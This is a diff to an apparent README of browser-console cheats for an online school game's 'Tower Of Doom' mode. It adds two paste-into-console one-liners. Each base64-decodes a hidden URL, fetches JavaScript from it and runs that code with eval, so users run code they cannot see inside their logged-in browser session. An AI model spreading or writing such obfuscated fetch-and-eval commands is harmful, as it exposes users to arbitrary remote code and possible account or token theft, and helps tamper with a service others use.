@@ -111,4 +111,21 @@ fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2Fk
 ```
 
 
+## Tower Of Doom
+
+
+## <a id="AddCoins"></a>AddCoins.js
+Open Console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L3RvZEFkZENvaW5zLmpz')).then((res) => res.text().then((t) => eval(t)))
+```
+## <a id="LowerAllEnemyStats"></a>LowerAllEnemyStats.js
+Open Console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY2OTkyL3RvZExvd2VyQWxsRW5lbXlTdGF0cy5qcw==')).then((res) => res.text().then((t) => eval(t)))
+```
+
+
+
+
 ## More hacks are coming soon if someone coments on this with more working hacks i will add them
